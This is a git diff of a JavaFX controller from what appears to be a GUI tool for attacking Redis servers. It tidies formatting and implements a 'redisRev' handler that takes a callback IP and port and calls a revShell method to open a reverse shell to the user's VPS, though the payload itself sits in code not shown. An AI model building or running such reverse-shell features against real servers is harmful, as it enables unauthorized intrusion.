@@ -15,6 +15,7 @@ import javafx.scene.control.ComboBox;
 import javafx.scene.control.TextArea;
 import javafx.scene.control.TextField;
 import org.json.JSONObject;
+
 import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
@@ -69,7 +70,7 @@ public class RedisController implements Initializable {
     private Button redisRevBtn;
 
     @FXML
-    private TextField redisRevIPaddressTextField;
+    private TextField redisRevIPTextField;
 
     @FXML
     private TextField redisRevPortTextField;
@@ -159,12 +160,12 @@ public class RedisController implements Initializable {
                     Platform.runLater(() -> {
                         MessageUtil.showExceptionMessage(e, e.getMessage());
                     });
-                }finally {
+                } finally {
                     RedisDao.CONN.slaveofNoOne();
                 }
             } else {
                 Platform.runLater(() -> {
-                    MessageUtil.showErrorMessage( "请输入vps地址和端口");
+                    MessageUtil.showErrorMessage("请输入vps地址和端口");
                 });
 
             }
@@ -189,7 +190,7 @@ public class RedisController implements Initializable {
             String code = redisEncodeCombox.getValue();
             if (code == null) {
                 Platform.runLater(() -> {
-                    MessageUtil.showErrorMessage( "请选择编码类型");
+                    MessageUtil.showErrorMessage("请选择编码类型");
                 });
                 return;
             }
@@ -200,7 +201,34 @@ public class RedisController implements Initializable {
         };
         Thread workThrad = new Thread(runner);
         workThrad.start();
+    }
 
+    /**
+     * 反弹shell
+     **/
+    @FXML
+    void redisRev(ActionEvent event) {
+        Runnable runner = () -> {
+            String revIp = this.redisRevIPTextField.getText();
+            String revPort = redisRevPortTextField.getText();
+            if (revIp == null || revIp.isEmpty() || revPort == null || revPort.isEmpty()) {
+                Platform.runLater(() -> {
+                    MessageUtil.showErrorMessage("请补全反弹的ip地址或端口");
+                });
+                return;
+            }
+
+            Platform.runLater(() -> {
+                redisLogTextFArea.appendText(Utils.log("正在尝试反弹到: " + revIp + ":" + revPort + " 请稍等,注意查看vps"));
+            });
+
+            String result = this.redisDao.revShell(revIp, revPort);
+            Platform.runLater(() -> {
+                redisOutputTextFArea.setText(result);
+            });
+        };
+        Thread workThread = new Thread(runner);
+        workThread.start();
     }
 
     /**
@@ -216,10 +244,5 @@ public class RedisController implements Initializable {
         redisEncodeCombox.setPromptText("UTF-8");
         redisEncodeCombox.setValue("UTF-8");
         redisEncodeCombox.setItems(postgreSqlTypeCodeoptions);
-    }
-
-    @FXML
-    void redisRev(ActionEvent event) {
-
     }
 }
